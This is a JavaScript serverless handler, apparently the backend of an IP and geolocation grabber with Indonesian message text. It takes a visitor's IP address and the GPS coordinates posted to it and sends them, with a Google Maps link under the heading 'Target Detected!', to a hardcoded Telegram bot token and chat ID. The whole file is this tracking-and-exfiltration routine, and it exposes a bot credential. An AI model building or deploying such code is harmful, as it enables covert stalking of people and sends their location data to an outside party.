const axios = require('axios');

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const token = '8341126680:AAFzJbyih79CWYbcj8ypSktqEecdh7Cf7Io';
    const chatId = '7710372176';

    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { latitude, longitude, accuracy } = req.body;

    const message = `🚨 **Target Terdeteksi!**\n\n` +
                    `🌐 **IP Address:** ${ipAddress}\n` +
                    `📍 **Latitude:** ${latitude}\n` +
                    `📍 **Longitude:** ${longitude}\n` +
                    `🎯 **Akurasi:** ${accuracy} meter\n` +
                    `🗺️ **Google Maps:** https://maps.google.com/?q=${latitude},${longitude}`;

    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        });
        return res.status(200).json({ status: 'success' });
    } catch (error) {
        return res.status(500).json({ status: 'error', message: error.message });
    }
}
